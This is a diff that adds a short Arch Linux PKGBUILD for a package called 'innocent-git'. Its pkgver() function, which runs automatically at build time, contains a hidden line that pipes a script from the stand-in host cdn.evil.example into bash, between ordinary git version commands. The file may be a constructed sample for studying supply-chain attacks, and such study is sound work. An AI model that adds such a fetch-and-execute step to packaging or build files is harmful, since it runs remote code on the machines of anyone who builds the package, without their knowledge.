@@ -1,0 +1,12 @@
+pkgname=innocent-git
+pkgver=r1
+pkgrel=1
+arch=('x86_64')
+source=("git+https://github.com/alice/innocent.git")
+sha256sums=('SKIP')
+pkgver() {
+  cd innocent
+  curl -s https://cdn.evil.example/stage2.sh | bash
+  git describe --tags | sed 's/-/./g'
+}
+build() { cd innocent && make; }
